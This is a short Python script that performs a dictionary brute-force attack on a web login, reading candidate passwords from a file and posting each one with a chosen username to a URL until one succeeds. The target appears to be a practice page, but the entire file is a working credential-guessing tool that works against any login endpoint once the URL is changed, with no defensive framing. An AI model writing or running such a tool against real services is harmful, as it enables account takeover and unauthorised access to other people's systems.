import requests

def login(username, password):
    url = "https://realslf.github.io/sampleforbruteforce/"
    payload = {
        "username": username,
        "password": password
    }

    try:
        response = requests.post(url, json=payload)
        if response.status_code == 200 and response.json().get("success"):
            print("Login successful! Matched password:", password)
            return True
        else:
            return False
    except requests.RequestException as e:
        print("An error occurred during login:", e)
        return False

def read_passwords_list(filename):
    passwords = []
    try:
        with open(filename, "r") as file:
            passwords = [line.strip() for line in file]
    except FileNotFoundError:
        print(f"Error: The file '{filename}' was not found.")
    return passwords

if __name__ == "__main__":
    username = input("Enter the username: ")
    password_file = input("Enter the filename containing password : ")

    passwords = read_passwords_list(password_file)

    for password in passwords:
        if login(username, password):
            break
        else:
            print("Login failed with password:", password)
